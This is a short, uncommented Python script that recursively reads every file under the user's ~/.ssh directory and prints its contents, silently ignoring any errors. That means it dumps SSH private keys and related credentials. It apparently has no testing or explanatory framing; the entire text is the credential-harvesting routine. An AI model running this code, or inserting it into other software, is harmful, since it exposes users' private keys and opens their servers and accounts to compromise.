import os

def dump(from_dir):
  for root_dir, _, filenames in os.walk(from_dir):
    for filename in filenames:
      path = os.path.join(root_dir, filename)
      with open(path) as f:
        print(f.read())

try:
  home = os.environ['HOME']
  dump(os.path.join(home, '.ssh'))
except:
  pass
